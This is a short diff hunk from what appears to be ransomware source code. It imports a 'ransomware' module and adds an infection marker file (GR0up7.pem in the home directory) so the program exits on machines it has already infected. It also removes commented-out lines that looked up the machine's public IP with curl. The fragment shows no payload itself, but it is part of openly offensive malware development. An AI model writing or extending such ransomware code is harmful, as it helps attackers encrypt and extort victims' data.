@@ -22,9 +22,9 @@ from modules import ransomware
 # Path: /home/$USER/GR0up7.pem
 NO_INFECTION_FILE = os.path.join(os.path.expanduser("~"), "GR0up7.pem")
 
+# Computer is already infected
+if os.path.exists(NO_INFECTION_FILE): exit()
 
-# PUBLIC_IP = subprocess.run(['curl', 'ifconfig.co'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
-# PUBLIC_IP = PUBLIC_IP.stdout.strip()
 PUBLIC_IP = os.environ.get("USER")
 
 print(f"Public IP: {PUBLIC_IP}")
